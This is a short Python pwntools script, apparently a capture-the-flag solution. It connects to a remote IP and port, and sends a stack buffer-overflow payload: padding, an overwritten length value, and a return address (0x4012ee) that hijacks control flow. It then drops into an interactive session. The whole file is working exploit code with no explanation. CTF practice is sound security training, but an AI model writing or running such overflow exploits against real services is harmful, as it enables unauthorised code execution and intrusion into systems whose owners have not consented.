from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#p = process('./stack')
p = remote('43.249.195.138', 21062)

p.recvuntil('size: ')
p.sendline('200')
p.recvuntil('> ')
payload = b'a' * (32 - 4) + p32(28)
payload += 8 * b'a' + p64(0x4012ee)

p.sendline(payload)
p.interactive()
